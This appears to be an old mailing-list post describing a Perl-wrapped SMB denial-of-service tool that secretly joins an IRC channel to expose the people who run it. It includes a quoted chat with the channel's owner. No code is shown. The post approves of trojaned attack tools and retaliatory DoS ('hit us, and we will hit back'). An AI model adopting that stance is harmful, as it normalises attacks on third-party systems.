Subject: Re: I know its old,
 but what the heck does this do... (exposing a tool...)

Ok... am awake now and, have some infos yes...
Interesting bot.
Seems i have spoken with some people regarding this and the release.Here is
a brief outline of how it goes.
Attacks were done on some people who run shells on efnet irc network, so in
order to catch the *morons8 or, ppl who did launch the DoS
would then be showing up in #darknet channel, and responds to the ops or,
channel.
I ran this and saw it still clobbers smb,and still uses the original bug, so
d0s will still occur,
however, it will try and join, i believe thats a dead link in there now but,
would have tried to join a efnet node..
Speaking with #darknet owners:

> ok dude why was this released...
msg> we released the original working code. this started a massive war of
the kids,
unfortunately many innocent boxes got raped, so we decided to play a small
game, and make a *version plus*
or so so say.
> very interesting concept, new, intuitive to use perl, as many people would
decrypt it tho, using perl -e , isnt this alittle harsh...
msg> they run it, it wont affect them, atall, they will see the connection
and kill it,and since no D0s is launched, it wont really work
> hrmm well, it is a good idea, to capture the arseholes who wish to ddos
etc... i see why it is done but also, can i ask you
  do you know what a darknet is ? because, you seem to not see that, ppl
would assume this channel is all about 'darknets'..
 instead it is only capturing people who will launch a DoS tool,and many
people seem 'idle'.
msg> we dont control who comes here, now care, but when it comes to d0s, we
dont scrw about.hit us,and we will hit back.
Also, why are you asking me about code wich was made in 2003 or so :P~
> ahh well, thats purely because, i expose any BS like this code is, but, i
will not mark this as bullshit.
  it is horseshit :P and, i respect that your at the least, using some
shitty tool like d0s, instead of faking an exploit.
  I will class this not as exposed atall, instead, it will serve as some
form of tuition to skids.
  Run the tools you cannot read, and, expect even some shitty perlbot to pop
out. I like it!
  I will class this as exposed but intuitive, thankyou for your time.
msg> i dont care what you mark it as, the rule is simple, do not run d0s
./appz ! Have a nice day!
> Again thanks for your time, i will keep the nickname anonymous... your not
classed as a now-owner , so i guess it is more wtf this was all about, even
when you wrote the .c or, as i know it,
   was 'brain' or some dude... either way, i tip the black hat to you but
also warn you not always will them kids be happy to be owned by shitty .c ,
so, id be expecting more problems from release, than not
   This is your problem, and, i respect your views, just get some knowledge
into you about wtf a 'darknet' is prompto!
   Also have a nice day.

..........................................
Ok so, basically the talk i had with a now non op of channel but,
interesting coz, it is actually very popular, yet only a few actually
realise that theyre being linked now to a darknet technology app etc, and
theyre finding that maybe they should have kept those old ops :P or maybe
they could just release 'ipv6killer.c' and just fix some
settings..eitherway, it is kinda unique, and strange why there was no chat
about this app, until now.. nothing
solid wich shows this perl, and admittedly, thats a VERY clever bot for such
a small piece of code.
Anyhow, thanks to those who found this interesting, sorry to those who didnt
:)
I think i might hang in darknet channel and wait for a few "Hi im a lamer!"
etc... rofl.
cheers, and cheers to #darknet for atleast not faking the tool completely,
and, using a skeleton and structure of theyre OWN code.
Winnuke2000.c is NOT backdoored, and IS theyres also, I think they regret
releasing it now but, this was 2003, and, as i said, i will try and expose
anything i find strange, however, from now on, ill be marking exposes under
noise, as theyre non disclosures.
